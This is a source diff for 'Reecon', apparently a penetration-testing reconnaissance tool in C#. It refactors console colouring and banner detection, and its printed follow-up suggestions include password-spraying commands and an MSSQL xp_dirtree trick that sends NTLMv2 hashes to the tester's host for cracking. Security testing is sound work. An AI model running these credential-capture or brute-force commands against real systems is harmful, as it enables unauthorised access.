@@ -1,5 +1,4 @@
-﻿using Pastel;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
@@ -83,7 +82,7 @@ namespace Reecon
                 // No Custom File for it
                 if (fileName == "N/A")
                 {
-                    Console.WriteLine(portHeader.Pastel(Color.Green) + Environment.NewLine + $"- Reecon currently lacks {thePort.FriendlyName} support" + Environment.NewLine);
+                    Console.WriteLine(portHeader.Recolor(Color.Green) + Environment.NewLine + $"- Reecon currently lacks {thePort.FriendlyName} support" + Environment.NewLine);
                 }
                 else
                 {
@@ -120,11 +119,11 @@ namespace Reecon
 
                             default: portData = $"- Error - Reecon has not yet implemented {fileName} - Bug Reelix!"; break;
                         }
-                        Console.WriteLine(portHeader.Pastel(Color.Green) + Environment.NewLine + portData + Environment.NewLine);
+                        Console.WriteLine(portHeader.Recolor(Color.Green) + Environment.NewLine + portData + Environment.NewLine);
                     }
                     catch (Exception ex)
                     {
-                        Console.WriteLine($"Fatal Error retreiving Info for port {port} - {ex.Message} - Bug Reelix ASAP!".Pastel(Color.Red));
+                        Console.WriteLine($"Fatal Error retreiving Info for port {port} - {ex.Message} - Bug Reelix ASAP!".Recolor(Color.Red));
                     }
                 }
 
@@ -136,7 +135,7 @@ namespace Reecon
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine($"Fatal Error retreiving additional Info for port {port} - {ex.Message} - Bug Reelix ASAP!".Pastel(Color.Red));
+                    Console.WriteLine($"Fatal Error retreiving additional Info for port {port} - {ex.Message} - Bug Reelix ASAP!".Recolor(Color.Red));
                 }
             }
             else
@@ -166,21 +165,23 @@ namespace Reecon
 
             string unknownPortResult = "";
 
+            // No entries at all
             if (!bannerList.Any())
             {
-                unknownPortResult += $"Port {port} - Empty".Pastel(Color.Green);
+                unknownPortResult += $"Port {port} - Empty".Recolor(Color.Green);
                 Console.WriteLine(unknownPortResult + Environment.NewLine + "- No Response" + Environment.NewLine);
                 return "";
             }
 
+            // Intentionally closed
             foreach (string theBanner in bannerList)
             {
+                byte[] theBannerBytes = General.GetBytes(theBanner);
                 unknownPortResult = "";
 
                 // AMQP
                 if (theBanner.StartsWith("AMQP"))
                 {
-                    byte[] theBannerBytes = General.GetBytes(theBanner);
                     if (bannerList.Count != 8)
                     {
                         Console.WriteLine("AMQP found with an invalid Banner Byte Count! Bug Reelix");
@@ -190,7 +191,7 @@ namespace Reecon
                     // 4-7: Version
                     if (theBannerBytes[4] == 0 && theBannerBytes[5] == 0 && theBannerBytes[6] == 9 && theBannerBytes[7] == 1)
                     {
-                        Console.WriteLine("Port " + port + " - AMQP".Pastel(Color.Green) + Environment.NewLine + "- Version 0-9-1" + Environment.NewLine + "- Bug Reelix to finish AMQP decoding..." + Environment.NewLine);
+                        Console.WriteLine("Port " + port + " - AMQP".Recolor(Color.Green) + Environment.NewLine + "- Version 0-9-1" + Environment.NewLine + "- Bug Reelix to finish AMQP decoding..." + Environment.NewLine);
                         // theBanner = General.BannerGrab(ip, port, theBanner); // Need to send the bytes of AMQP0091
 
                         // Oh gawd....
@@ -200,13 +201,13 @@ namespace Reecon
                     }
                     else
                     {
-                        Console.WriteLine($"Port {port} - AMQP".Pastel(Color.Green) + Environment.NewLine + "- Unknown AMQP Version: " + (int)theBannerBytes[4] + (int)theBannerBytes[5] + (int)theBannerBytes[6] + (int)theBannerBytes[7] + Environment.NewLine);
+                        Console.WriteLine($"Port {port} - AMQP".Recolor(Color.Green) + Environment.NewLine + "- Unknown AMQP Version: " + (int)theBannerBytes[4] + (int)theBannerBytes[5] + (int)theBannerBytes[6] + (int)theBannerBytes[7] + Environment.NewLine);
                     }
                 }
                 // Asterisk Call Manager
                 else if (theBanner.StartsWith("Asterisk Call Manager"))
                 {
-                    unknownPortResult += $"Port {port} - Asterisk Call Manager".Pastel(Color.Green) + Environment.NewLine;
+                    unknownPortResult += $"Port {port} - Asterisk Call Manager".Recolor(Color.Green) + Environment.NewLine;
                     if (theBanner.Contains('/'))
                     {
                         unknownPortResult += "- Version: " + theBanner.Remove(0, theBanner.IndexOf('/') + 1) + Environment.NewLine;
@@ -221,17 +222,17 @@ namespace Reecon
                 {
                     if (theBanner.ToUpper().Contains("FTP"))
                     {
-                        unknownPortResult += $"Port {port} - FTP".Pastel(Color.Green) + Environment.NewLine;
+                        unknownPortResult += $"Port {port} - FTP".Recolor(Color.Green) + Environment.NewLine;
                         unknownPortResult += FTP.GetInfo(target, port);
                     }
                     else if (theBanner.ToUpper().Contains("SMTP"))
                     {
-                        unknownPortResult = $"Port {port} - SMTP".Pastel(Color.Green) + Environment.NewLine;
+                        unknownPortResult = $"Port {port} - SMTP".Recolor(Color.Green) + Environment.NewLine;
                         unknownPortResult += SMTP.GetInfo(target, port);
                     }
                     else
                     {
-                        unknownPortResult += $"Port {port} - Either SMTP or FTP".Pastel(Color.Green) + Environment.NewLine;
+                        unknownPortResult += $"Port {port} - Either SMTP or FTP".Recolor(Color.Green) + Environment.NewLine;
                         if (theBanner.EndsWith("\r\n"))
                         {
                             unknownPortResult += "- Windows Newline Characters Detected" + Environment.NewLine;
@@ -258,7 +259,7 @@ namespace Reecon
                     string httpsData = HTTPS.GetInfo(target, port);
                     if (httpsData != "")
                     {
-                        Console.WriteLine(unknownPortResult += $"Port {port} - HTTPS".Pastel(Color.Green) + Environment.NewLine + httpsData + Environment.NewLine);
+                        Console.WriteLine(unknownPortResult += $"Port {port} - HTTPS".Recolor(Color.Green) + Environment.NewLine + httpsData + Environment.NewLine);
                         postScanActions += $"- gobuster dir -u https://{target}:{port}/ -w ~/wordlists/directory-list-2.3-medium.txt -t 25 -o gobuster-{port}-medium.txt -x.php,.txt" + Environment.NewLine;
                         postScanActions += $"- gobuster dir -u https://{target}:{port}/ -w ~/wordlists/common.txt -t 25 -o gobuster-{port}-common.txt -x.php,.txt" + Environment.NewLine;
                     }
@@ -278,7 +279,7 @@ namespace Reecon
                     // WinRM - HTTP with special stuff
                     if (theBanner.Contains("Server: Microsoft-HTTPAPI/2.0"))
                     {
-                        unknownPortResult += $"Port {port} - WinRM".Pastel(Color.Green);
+                        unknownPortResult += $"Port {port} - WinRM".Recolor(Color.Green);
                         string portData = WinRM.GetInfo(target, port);
                         Console.WriteLine(unknownPortResult + Environment.NewLine + portData + Environment.NewLine);
                     }
@@ -289,45 +290,59 @@ namespace Reecon
                         if (httpData != "")
                         {
                             string headerText = $"Port {port} - HTTP" + (isHTTPS ? "S" : "");
-                            Console.WriteLine(unknownPortResult += headerText.Pastel(Color.Green) + Environment.NewLine + httpData + Environment.NewLine);
+                            Console.WriteLine(unknownPortResult += headerText.Recolor(Color.Green) + Environment.NewLine + httpData + Environment.NewLine);
                             postScanActions += "- gobuster dir -u http" + (isHTTPS ? "s" : "") + $"://{target}:{port}/ -w ~/wordlists/directory-list-2.3-medium.txt -t 25 -o gobuster-" + port + "-medium.txt -x.php,.txt" + Environment.NewLine;
                             postScanActions += "- gobuster dir -u http" + (isHTTPS ? "S" : "") + $"://{target}:{port}/ -w ~/wordlists/common.txt -t 25 -o gobuster-" + port + "-common.txt -x.php,.txt" + Environment.NewLine;
                         }
                     }
                     break;
                 }
+                // Minecraft
+                else if (theBannerBytes[0] == 0xFF && theBannerBytes[4] == 0x00)
+                {
+                    Console.WriteLine("Possibly Minecraft - Bug Reelix!");
+                    Minecraft.GetInfo(target, port);
+                }
+                // MySQL
+                else if (theBanner.StartsWith("c") && theBanner.Contains("\0mysql_native_password\0"))
+                {
+                    unknownPortResult += $"Port {port} - MySQL".Recolor(Color.Green);
+                    string portData = MySQL.GetInfo(target, port);
+                    Console.WriteLine(unknownPortResult + Environment.NewLine + portData + Environment.NewLine);
+                    break;
+                }
                 // POP3 - 1
                 else if (theBanner == "+OK Dovecot ready.")
                 {
-                    unknownPortResult += $"Port {port} - POP3 (Dovecot)".Pastel(Color.Green) + Environment.NewLine;
+                    unknownPortResult += $"Port {port} - POP3 (Dovecot)".Recolor(Color.Green) + Environment.NewLine;
                     unknownPortResult += POP3.GetInfo(target, port);
                     Console.WriteLine(unknownPortResult);
                 }
                 // POP3 - 2
                 else if (theBanner.StartsWith("+OK ") && theBanner.Contains("POP3"))
                 {
-                    unknownPortResult += $"Port {port} - POP3".Pastel(Color.Green) + Environment.NewLine;
+                    unknownPortResult += $"Port {port} - POP3".Recolor(Color.Green) + Environment.NewLine;
                     unknownPortResult += POP3.GetInfo(target, port);
                     Console.WriteLine(unknownPortResult);
                 }
                 // Redis
                 else if (theBanner == "-ERR unknown command 'Woof'")
                 {
-                    unknownPortResult += $"Port {port} - Redis".Pastel(Color.Green);
+                    unknownPortResult += $"Port {port} - Redis".Recolor(Color.Green);
                     string portData = Redis.GetInfo(target, port);
                     Console.WriteLine(unknownPortResult + Environment.NewLine + portData + Environment.NewLine);
                 }
                 // Rsync
                 else if (theBanner.StartsWith("@RSYNCD"))
                 {
-                    unknownPortResult += $"Port {port} - Rsync".Pastel(Color.Green) + Environment.NewLine;
+                    unknownPortResult += $"Port {port} - Rsync".Recolor(Color.Green) + Environment.NewLine;
                     unknownPortResult += Rsync.GetInfo(target, port);
                     Console.WriteLine(unknownPortResult);
                 }
                 // SMTP
                 else if (theBanner.StartsWith("220") && theBanner.Contains("ESMTP"))
                 {
-                    unknownPortResult += $"Port {port} - SMTP".Pastel(Color.Green);
+                    unknownPortResult += $"Port {port} - SMTP".Recolor(Color.Green);
                     string smtpInfo = SMTP.GetInfo(target, port); // Can't just parse the banner directly since there could be other useful stuff
                     Console.WriteLine(unknownPortResult + Environment.NewLine + smtpInfo + Environment.NewLine);
 
@@ -338,7 +353,7 @@ namespace Reecon
                 // SSH-2.0-SSH
                 else if (theBanner.StartsWith("SSH-2.0-"))
                 {
-                    unknownPortResult += $"Port {port} - SSH".Pastel(Color.Green) + Environment.NewLine;
+                    unknownPortResult += $"Port {port} - SSH".Recolor(Color.Green) + Environment.NewLine;
                     if (theBanner.Contains("\r\nProtocol mismatch."))
                     {
                         unknownPortResult += Environment.NewLine + "- TCP Protocol Mismatch";
@@ -349,42 +364,42 @@ namespace Reecon
                 // Squid - HTTP with different special stuff
                 else if (theBanner.Contains("Server: squid"))
                 {
-                    unknownPortResult += $"Port {port} - Squid".Pastel(Color.Green);
+                    unknownPortResult += $"Port {port} - Squid".Recolor(Color.Green);
                     string portData = Squid.GetInfo(target, port);
                     Console.WriteLine(unknownPortResult + Environment.NewLine + portData + Environment.NewLine);
                 }
                 // SVN
                 else if (theBanner.Trim().StartsWith("( success ( 2 2 ( ) ( edit-pipeline"))
                 {
-                    unknownPortResult += $"Port {port} - SVN (Subversion)".Pastel(Color.Green) + Environment.NewLine;
+                    unknownPortResult += $"Port {port} - SVN (Subversion)".Recolor(Color.Green) + Environment.NewLine;
                     unknownPortResult += "- Bug Reelix to fix this. Ref: Port 3690";
                     Console.WriteLine(unknownPortResult);
                 }
                 // Telnet - Third can be a number of things depending on the protocol - Check Telnet.cs
                 else if (theBanner.Length > 5 && theBanner[0] == 255 && theBanner[1] == 253)
                 {
-                    unknownPortResult += $"Port {port} - Telnet".Pastel(Color.Green) + Environment.NewLine;
+                    unknownPortResult += $"Port {port} - Telnet".Recolor(Color.Green) + Environment.NewLine;
                     unknownPortResult += Telnet.GetInfo(target, port);
                     Console.WriteLine(unknownPortResult);
                 }
                 // VNC
                 else if (theBanner.StartsWith("RFB "))
                 {
-                    unknownPortResult += $"Port {port} - VNC".Pastel(Color.Green) + Environment.NewLine;
+                    unknownPortResult += $"Port {port} - VNC".Recolor(Color.Green) + Environment.NewLine;
                     unknownPortResult += VNC.GetInfo(target, port);
                     Console.WriteLine(unknownPortResult);
                 }
                 // Windows RPC over HTTP
                 else if (theBanner == "ncacn_http/1.0")
                 {
-                    unknownPortResult += "- Microsoft Windows RPC over HTTP".Pastel(Color.Green) + Environment.NewLine;
+                    unknownPortResult += "- Microsoft Windows RPC over HTTP".Recolor(Color.Green) + Environment.NewLine;
                     unknownPortResult += "- Reecon currently lacks Microsoft Windows RPC over HTTP support" + Environment.NewLine;
                     Console.WriteLine(unknownPortResult);
                 }
                 // XMPP
                 else if (theBanner == "</stream:stream>")
                 {
-                    unknownPortResult += $"Port {port} - xmpp".Pastel(Color.Green) + Environment.NewLine;
+                    unknownPortResult += $"Port {port} - xmpp".Recolor(Color.Green) + Environment.NewLine;
                     unknownPortResult += "- Client Name: Wildfire XMPP Client" + Environment.NewLine;
                     Console.WriteLine(unknownPortResult);
                 }
@@ -392,9 +407,10 @@ namespace Reecon
             // 47538/tcp open  socks-proxy Socks4A
             // -> [?? _ ??
 
+            // It's gone through everything and there's still no regular results
             if (unknownPortResult == "")
             {
-                // If there are 2 results and 1 "Closed" - Removed the Closed
+                // If there are 2 results and 1 "Closed" - Removed the Closed (Weird edge case...)
                 if (bannerList.Count == 2)
                 {
                     if (bannerList.Count(x => x == "Reecon - Closed") == 1)
@@ -412,19 +428,19 @@ namespace Reecon
                     }
                     else if (theBanner == "Reecon - Closed")
                     {
-                        unknownPortResult += $"Port {port} - Closed".Pastel(Color.Green) + Environment.NewLine;
+                        unknownPortResult += $"Port {port} - Closed".Recolor(Color.Green) + Environment.NewLine;
                         unknownPortResult += "- Port is closed" + Environment.NewLine;
                     }
                     else
                     {
-                        unknownPortResult += $"Port {port} - Unknown".Pastel(Color.Green) + Environment.NewLine;
+                        unknownPortResult += $"Port {port} - Unknown".Recolor(Color.Green) + Environment.NewLine;
                         unknownPortResult += "- Unknown Response: -->" + theBanner + "<--" + Environment.NewLine;
                         unknownPortResult += $"- TODO: nmap -sC -sV {target} -p{port}" + Environment.NewLine;
                     }
                 }
                 else
                 {
-                    unknownPortResult += $"Port {port} - Unknown (Dumping possible outcomes)".Pastel(Color.Red) + Environment.NewLine;
+                    unknownPortResult += $"Port {port} - Unknown (Dumping possible outcomes)".Recolor(Color.Red) + Environment.NewLine;
                     // Truly unknown - Find the best result
                     foreach (string theBanner in bannerList)
                     {
@@ -470,14 +486,14 @@ namespace Reecon
                 postScanActions += $"- gobuster dir -u http://{target}/ -w ~/wordlists/common.txt -t 25 -o gobuster-http-common.txt -x.php,.txt" + Environment.NewLine;
 
             }
-            else if (port == 88)
+            else if (port == 88 || port == 3268)
             {
                 // Post Scan
                 string defaultNamingContext = "Unknown";
                 try
                 {
-                    // It's generally assumed that if 88 is up, 389 is up as well.
-                    defaultNamingContext = LDAP.GetDefaultNamingContext(target, 389, true);
+                    // It's generally assumed that if 88 is up, 389 is up as well, although it could also be 3268
+                    defaultNamingContext = LDAP.GetDefaultNamingContext(target, port, true);
                 }
                 catch (Exception ex)
                 {
@@ -527,21 +543,21 @@ namespace Reecon
                 postScanActions += $"- Port 445 - I miss a lot: nmap -sC -sV -p445 {target}" + Environment.NewLine;
                 postScanActions += $"- Port 445 - Unauthenticated SID (Username) Lookup: lookupsid.py anonymous@{target} -no-pass | grep -e \"Brute forcing\" -e SidTypeUser -e STATUS_LOGON_FAILURE" + Environment.NewLine;
                 postScanActions += $"- Port 445 - Authenticated SID Lookup: lookupsid.py DOMAIN/Username:password@{target}" + Environment.NewLine;
-                postScanActions += $"- Port 445 - Testing passwords: crackmapexec smb {target} -u users.txt -p passwords.txt" + Environment.NewLine;
+                postScanActions += $"- Port 445 - Testing passwords: nxc smb {target} -u users.txt -p passwords.txt" + Environment.NewLine;
                 postScanActions += $"- Port 445 - List Shares: smbclient -L //{target} -U validusername%validpass" + Environment.NewLine;
                 postScanActions += $"- Port 445 - Connect Share: smbclient -U validusername%validpass //{target}/shareName" + Environment.NewLine;
             }
             else if (port == 1433)
             {
                 postScanActions += $"- MSSQL - Nmap has more: sudo nmap {target} -p 1433 --script ms-sql-info" + Environment.NewLine;
-                postScanActions += $"- MSSQL - Brute force creds: crackmapexec mssql {target} -u users.txt -p pass.txt" + Environment.NewLine;
+                postScanActions += $"- MSSQL - Brute force creds: nxc mssql {target} -u users.txt -p pass.txt" + Environment.NewLine;
                 postScanActions += $"- MSSQL - Connect: mssqlclient.py (-windows-auth is optional, but can be required) {target}/userHere:passHere@{target}" + Environment.NewLine;
                 postScanActions += @"- MSSQL - If you connect, run responder, and try get the NTLMv2 hash: exec xp_dirtree '\\yourip\anythinghere' (hashcat -m 5600 - NOT -ssp hashes)" + Environment.NewLine;
                 postScanActions += @"- MSSQL - Explore the file system: exec xp_dirtree 'C:\',1,1" + Environment.NewLine;
             }
             else if (port == 2049)
             {
-                postScanActions += " - NFS: rpcinfo -p " + target + Environment.NewLine;
+                postScanActions += "- NFS: rpcinfo -p " + target + Environment.NewLine;
             }
             else if (port == 3128)
             {
